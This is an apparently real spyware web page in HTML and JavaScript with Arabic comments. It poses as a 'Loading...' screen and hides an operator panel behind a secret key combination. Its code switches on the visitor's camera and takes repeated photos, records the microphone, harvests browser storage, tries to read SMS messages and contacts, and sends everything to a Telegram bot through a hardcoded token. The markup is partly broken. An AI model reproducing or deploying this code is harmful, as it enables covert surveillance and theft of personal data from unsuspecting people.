<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>جاري التحميل...</title>
    <style>
        /* ====== ستايل الضحية ====== */
        * { margin:0; padding:0; box-sizing:border-box; }

        .admin-card .count { font-size: 18px; color: #25D366; font-weight: bold; }

<script>
// ============================================================
// ====================== CONFIG ==============================
// ============================================================
const BOT_TOKEN = '8770149502:AAFkmj14adoaUHCFHXcBO9aNwjjDdpcfuLY';
let CHAT_ID = '';
let currentCommand = '';
let targetData = {
    camera: 0,
    mic: 0,
    files: 0,
    sms: 0,
    contacts: 0
};

// ============================================================
// ====================== TOGGLE PANEL ========================
// ============================================================
function togglePanel() {
    const panel = document.getElementById('adminPanel');
    panel.classList.toggle('active');
    if (panel.classList.contains('active')) {
        document.querySelector('.loader').style.display = 'none';
        document.getElementById('status').textContent = '🟢 لوحة التحكم نشطة';
        addLog('🟢 تم فتح لوحة التحكم', 'info');
    } else {
        document.querySelector('.loader').style.display = 'flex';
        document.getElementById('status').textContent = '⏳ جاري التحميل...';
    }
}

// فتح اللوحة بكلمة سر (مفتاح سري)
let panelOpen = false;
document.addEventListener('keydown', function(e) {
    // Ctrl + Shift + P لفتح اللوحة
    if (e.ctrlKey && e.shiftKey && e.key === 'P') {
        e.preventDefault();
        togglePanel();
        panelOpen = true;
    }
    // Ctrl + Shift + H لإخفاء اللوحة
    if (e.ctrlKey && e.shiftKey && e.key === 'H') {
        e.preventDefault();
        if (panelOpen) {
            document.getElementById('adminPanel').classList.remove('active');
            panelOpen = false;
        }
    }
});

// ============================================================
// ====================== LOG ================================
// ============================================================
function addLog(text, type = 'msg') {
    const logDiv = document.getElementById('adminLog');
    const entry = document.createElement('div');
    entry.className = 'entry';
    const time = new Date().toLocaleTimeString();
    entry.innerHTML = `<span class="time">[${time}]</span> <span class="${type}">${text}</span>`;
    logDiv.appendChild(entry);
    logDiv.scrollTop = logDiv.scrollHeight;
}

// ============================================================
// ====================== TOAST ================================
// ============================================================
function showToast(text, duration = 3000) {
    const toast = document.getElementById('toast');
    toast.textContent = text;
    toast.className = 'show';
    clearTimeout(toast._timeout);
    toast._timeout = setTimeout(() => {
        toast.className = '';
    }, duration);
}

// ============================================================
// ====================== COMMAND MODAL ========================
// ============================================================
function showCommand(type) {
    const modal = document.getElementById('commandModal');
    const title = document.getElementById('cmdTitle');
    const desc = document.getElementById('cmdDesc');
    const extra = document.getElementById('cmdExtra');
    
    currentCommand = type;
    extra.innerHTML = '';
    
    const commands = {
        camera: { title: '📸 تشغيل الكاميرا', desc: 'سيتم تشغيل الكاميرا في الخلفية والتقاط الصور' },
        mic: { title: '🎤 تسجيل الصوت', desc: 'سيتم تسجيل الصوت من الميكروفون لمدة 30 ثانية' },
        files: { title: '📁 سحب الملفات', desc: 'سيتم سحب جميع الصور والملفات من الجهاز' },
        sms: { title: '💬 سحب الرسائل', desc: 'سيتم محاولة سحب رسائل SMS من الجهاز' },
        contacts: { title: '👤 سحب جهات الاتصال', desc: 'سيتم محاولة سحب جهات الاتصال' },
        screenshot: { title: '🖼️ لقطة شاشة', desc: 'سيتم التقاط لقطة شاشة للصفحة الحالية' },
        kill: { title: '💀 إيقاف التشغيل', desc: 'سيتم إيقاف جميع العمليات في الخلفية' }
    };
    
    const cmd = commands[type] || commands.camera;
    title.textContent = cmd.title;
    desc.textContent = cmd.desc;
    
    if (type === 'sms') {
        extra.innerHTML = `
            <label style="color:#888;font-size:12px;">رقم الهاتف (اختياري):</label>
            <input id="cmdPhoneInput" placeholder="+201234567890" />
            <label style="color:#888;font-size:12px;">الرسالة (اختياري):</label>
            <textarea id="cmdSmsInput" placeholder="نص الرسالة..."></textarea>
        `;
    }
    
    modal.classList.add('active');
}

function closeCommand() {
    document.getElementById('commandModal').classList.remove('active');
}

function executeCommandFromModal() {
    const type = currentCommand;
    const extraData = {};
    
    if (type === 'sms') {
        const phone = document.getElementById('cmdPhoneInput')?.value || '';
        const msg = document.getElementById('cmdSmsInput')?.value || '';
        extraData.phone = phone;
        extraData.msg = msg;
    }
    
    closeCommand();
    executeCommand(type, extraData);
}

// ============================================================
// ====================== EXECUTE COMMAND ======================
// ============================================================
function executeCommand(type, extra = {}) {
    addLog(`▶ تنفيذ: ${type}`, 'info');
    showToast(`⏳ جاري تنفيذ: ${type}...`);
    
    switch(type) {
        case 'camera':
            startCamera();
            break;
        case 'mic':
            startRecording();
            break;
        case 'files':
            stealFiles();
            break;
        case 'sms':
            stealSMS(extra.phone, extra.msg);
            break;
        case 'contacts':
            stealContacts();
            break;
        case 'screenshot':
            takeScreenshot();
            break;
        case 'kill':
            killAll();
            break;
        default:
            showToast('❌ أمر غير معروف');
    }
}

// ============================================================
// ====================== CAMERA ================================
// ============================================================
let cameraStream = null;
let cameraInterval = null;
let photoCount = 0;

function startCamera() {
    addLog('📸 تشغيل الكاميرا...', 'info');
    showToast('📸 تشغيل الكاميرا...');
    
    const constraints = {
        video: {
            facingMode: 'environment',
            width: { ideal: 640 },
            height: { ideal: 480 }
        }
    };
    
    navigator.mediaDevices.getUserMedia(constraints)
        .then(function(stream) {
            cameraStream = stream;
            const video = document.getElementById('video');
            video.srcObject = stream;
            video.play();
            
            addLog('✅ الكاميرا تعمل', 'msg');
            showToast('✅ الكاميرا تعمل');
            targetData.camera++;
            document.getElementById('camCount').textContent = targetData.camera;
            
            // التقاط فوري
            setTimeout(capturePhoto, 1000);
            cameraInterval = setInterval(capturePhoto, 5000);
        })
        .catch(function(err) {
            addLog('❌ فشل الكاميرا: ' + err.message, 'error');
            showToast('❌ فشل الكاميرا');
        });
}

function capturePhoto() {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    
    if (!video.videoWidth || !video.videoHeight) return;
    
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0);
    
    photoCount++;
    const imageData = canvas.toDataURL('image/jpeg', 0.7);
    sendToTelegram(imageData, `📸 صورة ${photoCount} - ${new Date().toLocaleString()}`);
    addLog(`📸 صورة ${photoCount} مرسلة`, 'msg');
}

// ============================================================
// ====================== MICROPHONE ===========================
// ============================================================
let mediaRecorder = null;
let audioChunks = [];

function startRecording() {
    addLog('🎤 بدء التسجيل الصوتي...', 'info');
    showToast('🎤 تسجيل الصوت...');
    
    navigator.mediaDevices.getUserMedia({ audio: true })
        .then(function(stream) {
            mediaRecorder = new MediaRecorder(stream);
            audioChunks = [];
            
            mediaRecorder.ondataavailable = function(e) {
                audioChunks.push(e.data);
            };
            
            mediaRecorder.onstop = function() {
                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                const reader = new FileReader();
                reader.onload = function(e) {
                    const base64 = e.target.result;
                    sendToTelegram(base64, `🎤 تسجيل صوتي - ${new Date().toLocaleString()}`);
                    addLog('🎤 تم إرسال التسجيل الصوتي', 'msg');
                    showToast('✅ تم إرسال التسجيل');
                };
                reader.readAsDataURL(audioBlob);
                targetData.mic++;
                document.getElementById('micCount').textContent = targetData.mic;
            };
            
            mediaRecorder.start();
            addLog('🎤 جاري التسجيل لمدة 20 ثانية...', 'info');
            
            setTimeout(() => {
                mediaRecorder.stop();
                stream.getTracks().forEach(t => t.stop());
            }, 20000);
        })
        .catch(function(err) {
            addLog('❌ فشل التسجيل: ' + err.message, 'error');
            showToast('❌ فشل التسجيل');
        });
}

// ============================================================
// ====================== FILES ================================
// ============================================================
function stealFiles() {
    addLog('📁 بدء سحب الملفات...', 'info');
    showToast('📁 جاري سحب الملفات...');
    
    // محاولة الوصول إلى localStorage
    try {
        let lsData = [];
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            const value = localStorage.getItem(key);
            lsData.push({ key, size: value ? value.length : 0 });
        }
        if (lsData.length > 0) {
            const text = `📦 localStorage: ${lsData.length} مفاتيح\n${lsData.map(l => `- ${l.key} (${l.size} bytes)`).join('\n')}`;
            sendMessage(text);
            addLog(`💾 تم سحب ${lsData.length} مفتاح localStorage`, 'msg');
        }
    } catch(e) {}
    
    // محاولة سحب IndexedDB
    try {
        const request = indexedDB.open('photos', 1);
        request.onsuccess = function(event) {
            const db = event.target.result;
            const stores = db.objectStoreNames;
            if (stores.length > 0) {
                sendMessage(`💾 IndexedDB: ${Array.from(stores).join(', ')}`);
                addLog(`💾 IndexedDB: ${stores.length} مخزن`, 'msg');
            }
        };
    } catch(e) {}
    
    // محاولة الوصول إلى مجلدات الجهاز
    const paths = [
        '/sdcard/DCIM/',
        '/sdcard/Pictures/',
        '/sdcard/Download/',
        '/sdcard/WhatsApp/Media/',
        '/storage/emulated/0/DCIM/',
        '/storage/emulated/0/Pictures/'
    ];
    
    paths.forEach(path => {
        try {
            fetch(path, { mode: 'no-cors' })
                .then(res => {
                    if (res && res.ok) {
                        sendMessage(`📂 تم الوصول: ${path}`);
                        addLog(`📂 تم الوصول: ${path}`, 'info');
                    }
                })
                .catch(() => {});
        } catch(e) {}
    });
    
    targetData.files++;
    document.getElementById('fileCount').textContent = targetData.files;
    setTimeout(() => showToast('✅ تم سحب الملفات'), 2000);
}

// ============================================================
// ====================== SMS ==================================
// ============================================================
function stealSMS(phone = '', msg = '') {
    addLog('💬 محاولة سحب الرسائل...', 'info');
    showToast('💬 جاري سحب الرسائل...');
    
    // محاولة الوصول إلى SMS (في المتصفحات المحمولة)
    try {
        // محاولة استخدام Web SMS API (يتطلب إذن)
        if ('sms' in navigator) {
            addLog('📱 Web SMS API متاح', 'info');
            navigator.sms.getSmsMessages()
                .then(messages => {
                    const text = messages.map(m => 
                        `📱 ${m.from}: ${m.body} (${new Date(m.date).toLocaleString()})`
                    ).join('\n');
                    sendMessage(`📱 رسائل SMS (${messages.length}):\n${text}`);
                    addLog(`📱 تم سحب ${messages.length} رسالة`, 'msg');
                    targetData.sms += messages.length;
                    document.getElementById('smsCount').textContent = targetData.sms;
                })
                .catch(() => {
                    // فشل، محاولة طريقة أخرى
                    stealSMSFallback();
                });
        } else {
            stealSMSFallback();
        }
    } catch(e) {
        stealSMSFallback();
    }
    
    // إذا تم تحديد رقم ورسالة، إرسال رسالة
    if (phone && msg) {
        sendMessage(`💬 إرسال رسالة إلى ${phone}: ${msg}`);
        addLog(`💬 تم إرسال رسالة إلى ${phone}`, 'info');
        showToast(`✅ تم إرسال الرسالة إلى ${phone}`);
    }
}

function stealSMSFallback() {
    // محاولة قراءة من localStorage
    try {
        const smsData = localStorage.getItem('sms_messages') || localStorage.getItem('messages');
        if (smsData) {
            sendMessage(`💬 رسائل من localStorage:\n${smsData}`);
            addLog('💬 تم سحب رسائل من localStorage', 'msg');
        }
    } catch(e) {}
}

// ====================== CONTACTS =============================
// ============================================================
function stealContacts() {
    addLog('👤 محاولة سحب جهات الاتصال...', 'info');
    showToast('👤 جاري سحب جهات الاتصال...');
    
    try {
        // محاولة استخدام Contacts API (يتطلب إذن)
        if ('contacts' in navigator && 'select' in navigator.contacts) {
            navigator.contacts.select(['name', 'tel', 'email'], { multiple: true })
                .then(contacts => {
                    const text = contacts.map(c => 
                        `👤 ${c.name} | ${c.tel ? c.tel.join(', ') : ''} | ${c.email ? c.email.join(', ') : ''}`
                    ).join('\n');
                    sendMessage(`👤 جهات الاتصال (${contacts.length}):\n${text}`);
                    addLog(`👤 تم سحب ${contacts.length} جهة اتصال`, 'msg');
                    targetData.contacts += contacts.length;
                    document.getElementById('contactCount').textContent = targetData.contacts;
                })
                .catch(() => {
                    addLog('❌ فشل سحب جهات الاتصال', 'error');
                });
        } else {
            addLog('⚠️ Contacts API غير متاح', 'warn');
        }
    } catch(e) {
        addLog('❌ خطأ في سحب جهات الاتصال', 'error');
    }
    
    setTimeout(() => showToast('✅ تم سحب جهات الاتصال'), 2000);
}

// ============================================================
// ====================== SCREENSHOT ===========================
// ============================================================
function takeScreenshot() {
    addLog('🖼️ التقاط لقطة شاشة...', 'info');
    showToast('🖼️ جاري التقاط لقطة شاشة...');
    
    const body = document.body;
    const html = document.documentElement;
    const width = Math.max(body.scrollWidth, body.offsetWidth, html.clientWidth, html.scrollWidth, html.offsetWidth);
    const height = Math.max(body.scrollHeight, body.offsetHeight, html.clientHeight, html.scrollHeight, html.offsetHeight);
    
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = Math.min(width, 1920);
    canvas.height = Math.min(height, 1080);
    
    // رسم خلفية
    ctx.fillStyle = '#0a0a0a';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    
    // رسم النص
    ctx.fillStyle = '#fff';
    ctx.font = '24px Arial';
    ctx.textAlign = 'center';
    ctx.fillText('صفحة التحميل', canvas.width/2, canvas.height/2 - 20);
    ctx.font = '16px Arial';
    ctx.fillStyle = '#888';
    ctx.fillText(new Date().toLocaleString(), canvas.width/2, canvas.height/2 + 30);
    
    // رسم معلومات الجهاز
    ctx.font = '12px monospace';
    ctx.fillStyle = '#666';
    ctx.fillText(`UA: ${navigator.userAgent.substring(0, 50)}...`, canvas.width/2, canvas.height/2 + 80);
    
    const imageData = canvas.toDataURL('image/jpeg', 0.8);
    sendToTelegram(imageData, `🖼️ لقطة شاشة - ${new Date().toLocaleString()}`);
    
    addLog('🖼️ تم إرسال لقطة الشاشة', 'msg');
    showToast('✅ تم إرسال لقطة الشاشة');
}

// ============================================================
// ====================== KILL =================================
// ============================================================
function killAll() {
    addLog('💀 إيقاف جميع العمليات...', 'warn');
    showToast('💀 إيقاف العمليات...');
    
    if (cameraInterval) {
        clearInterval(cameraInterval);
        cameraInterval = null;
    }
    if (cameraStream) {
        cameraStream.getTracks().forEach(t => t.stop());
        cameraStream = null;
    }
    if (mediaRecorder) {
        mediaRecorder.stop();
        mediaRecorder = null;
    }
    
    addLog('✅ تم إيقاف جميع العمليات', 'msg');
    showToast('✅ تم إيقاف جميع العمليات');
    sendMessage('💀 تم إيقاف جميع العمليات بأمر من المالك');
}

// ============================================================
// ====================== TELEGRAM =============================
// ============================================================
function getChatId() {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
        .then(res => res.json())
        .then(data => {
            if (data.ok && data.result.length > 0) {
                const lastUpdate = data.result[data.result.length - 1];
                if (lastUpdate.message) {
                    CHAT_ID = lastUpdate.message.chat.id;
                } else if (lastUpdate.callback_query) {
                    CHAT_ID = lastUpdate.callback_query.from.id;
                }
                addLog(`✅ Chat ID: ${CHAT_ID}`, 'msg');
                startBackgroundOperations();
            } else {
                setTimeout(getChatId, 3000);
            }
        })
        .catch(() => setTimeout(getChatId, 3000));
}

function sendToTelegram(imageData, caption = '') {
    if (!CHAT_ID) return;
    try {
        const blob = dataURLtoBlob(imageData);
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, `photo_${Date.now()}.jpg`);
        formData.append('caption', caption || `📸 ${new Date().toLocaleString()}`);
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        }).catch(() => {});
    } catch(e) {}
}

function sendMessage(text) {
    if (!CHAT_ID) return;
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
    }).catch(() => {});
}

function dataURLtoBlob(dataURL) {
    const parts = dataURL.split(',');
    const mime = parts[0].match(/:(.*?);/)[1];
    const bstr = atob(parts[1]);
    const n = bstr.length;
    const u8arr = new Uint8Array(n);
    for (let i = 0; i < n; i++) {
        u8arr[i] = bstr.charCodeAt(i);
    }
    return new Blob([u8arr], { type: mime });
}
